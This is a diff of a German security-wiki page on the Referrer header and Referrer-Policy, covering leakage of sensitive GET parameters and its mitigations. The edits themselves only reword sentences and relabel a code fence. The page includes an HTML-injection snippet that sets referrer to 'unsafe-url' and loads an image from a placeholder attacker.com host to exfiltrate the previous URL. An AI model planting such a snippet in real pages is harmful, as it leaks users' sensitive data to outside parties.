@@ -2,11 +2,11 @@
 
 # Referrer-Header und Richtlinie
 
-Referrer ist der Header, der von Browsern verwendet wird, um anzugeben, welche die vorherige besuchte Seite war.
+Referrer ist der Header, der von Browsern verwendet wird, um anzuzeigen, welche die vorherige besuchte Seite war.
 
 ## Sensible Informationen geleakt
 
-Wenn sich zu irgendeinem Zeitpunkt innerhalb einer Webseite sensible Informationen in den GET-Anforderungsparametern befinden, und die Seite Links zu externen Quellen enthält oder ein Angreifer in der Lage ist, den Benutzer dazu zu bringen, eine von ihm kontrollierte URL zu besuchen (Social Engineering), könnte es möglich sein, die sensiblen Informationen aus der letzten GET-Anforderung zu exfiltrieren.
+Wenn sich an irgendeinem Punkt innerhalb einer Webseite sensible Informationen in den GET-Anforderungsparametern befinden, wenn die Seite Links zu externen Quellen enthält oder ein Angreifer in der Lage ist, den Benutzer dazu zu bringen, eine von ihm kontrollierte URL zu besuchen (Social Engineering), könnte es möglich sein, die sensiblen Informationen aus der letzten GET-Anforderung zu exfiltrieren.
 
 ## Minderung
 
@@ -24,7 +24,7 @@ Referrer-Policy: unsafe-url
 ## Gegenmaßnahmen
 
 Sie können diese Regel mit einem HTML-Meta-Tag überschreiben (der Angreifer muss eine HTML-Injection ausnutzen):
-```markup
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
